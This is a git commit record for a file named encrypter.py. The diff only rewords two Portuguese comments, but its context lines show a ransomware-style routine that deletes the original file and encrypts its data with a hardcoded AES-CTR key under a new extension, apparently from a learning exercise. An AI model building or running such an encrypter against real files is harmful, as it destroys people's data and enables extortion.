bac77edf7e2dab89198b5b570f9a6eb738e890d5
Ramon Siqueira <152916035+Rmns28@users.noreply.github.com>
2025-04-02 23:13:22 -0300

    Create encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -14,10 +14,10 @@ os.remove(file_name)
 key = b"responsabilidade"
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
+## criptografar arquivo
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
+## salvar arquivo criptografado
 new_file = file_name + ".arquivocriptografado"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
